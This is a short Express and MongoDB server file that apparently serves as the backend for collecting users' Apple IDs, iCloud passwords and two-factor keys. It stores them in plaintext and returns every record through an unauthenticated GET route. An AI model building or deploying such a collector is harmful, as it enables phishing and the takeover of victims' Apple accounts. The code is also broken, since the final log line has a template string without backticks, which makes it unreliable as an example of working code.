const express = require('express');
const app = express();
const mongoose = require('mongoose');

// Replace 'your-railway-mongodb-connection-string' with the actual connection string from Railway
mongoose.connect('your-railway-mongodb-connection-string', { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('Could not connect to MongoDB...', err));

// Define a schema for the user inputs
const userInputSchema = new mongoose.Schema({
  appleId: String,
  icloudPassword: String,
  twoFAKey: String
});

// Create a model based on the schema
const UserInput = mongoose.model('UserInput', userInputSchema);

// Middleware to parse incoming JSON requests
app.use(express.json());

// Route to handle POST requests to save user input
app.post('/api/user-inputs', (req, res) => {
  const userInput = new UserInput(req.body);
  userInput.save()
    .then(() => res.send({ message: 'User input saved successfully' }))
    .catch(err => res.status(500).send(err));
});

// Route to handle GET requests to fetch all user inputs
app.get('/api/user-inputs', (req, res) => {
  UserInput.find()
    .then(userInputs => res.send(userInputs))
    .catch(err => res.status(500).send(err));
});

// Start the server on port 3000
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(Server started on port ${port});
});